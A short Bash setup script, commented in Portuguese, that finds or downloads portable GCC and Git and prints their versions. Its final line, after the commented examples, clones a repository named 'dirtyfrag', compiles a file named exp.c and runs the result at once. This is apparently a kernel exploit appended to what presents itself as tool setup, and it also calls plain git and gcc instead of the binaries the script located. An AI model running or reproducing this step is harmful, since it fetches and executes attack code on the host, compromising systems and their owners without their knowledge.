#!/usr/bin/env bash

set -e

########################################
# TEMP
########################################

TMP_DIR="${TMPDIR:-/tmp}/portable-tools"

mkdir -p "$TMP_DIR"

########################################
# FUNÇÃO: baixar GCC portátil
########################################

download_gcc() {

    echo "GCC não encontrado."
    echo "Baixando GCC portátil..."

    cd "$TMP_DIR"

    GCC_URL="https://musl.cc/x86_64-linux-musl-native.tgz"

    curl -L "$GCC_URL" -o gcc.tgz

    tar -xzf gcc.tgz

    GCC_BINARY="$(find "$TMP_DIR" -type f -name gcc | head -n 1)"

    export GCC_BINARY

    echo "GCC portátil:"
    echo "$GCC_BINARY"
}

########################################
# FUNÇÃO: baixar Git portátil
########################################

download_git() {

    echo "Git não encontrado."
    echo "Baixando Git portátil..."

    cd "$TMP_DIR"

    GIT_URL="https://github.com/rsms/git-static/releases/download/v2.45.2/linux-x64.tar.gz"

    curl -L "$GIT_URL" -o git.tar.gz

    tar -xzf git.tar.gz

    GIT_BINARY="$(find "$TMP_DIR" -type f -name git | head -n 1)"

    export GIT_BINARY

    echo "Git portátil:"
    echo "$GIT_BINARY"
}

########################################
# GCC
########################################

if command -v gcc >/dev/null 2>&1; then

    GCC_BINARY="$(command -v gcc)"

    echo "GCC encontrado:"
    echo "$GCC_BINARY"

else

    download_gcc

fi

########################################
# GIT
########################################

if command -v git >/dev/null 2>&1; then

    GIT_BINARY="$(command -v git)"

    echo "Git encontrado:"
    echo "$GIT_BINARY"

else

    download_git

fi

########################################
# EXPORTS
########################################

export GCC_BINARY
export GIT_BINARY

########################################
# TESTES
########################################

echo
echo "========== TESTES =========="

echo
echo "GCC:"
"$GCC_BINARY" --version | head -n 1

echo
echo "Git:"
"$GIT_BINARY" --version

########################################
# EXEMPLOS
########################################

# Compilar:
# "$GCC_BINARY" teste.c -o teste

# Git:
# "$GIT_BINARY" clone https://github.com/user/repo.git

git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
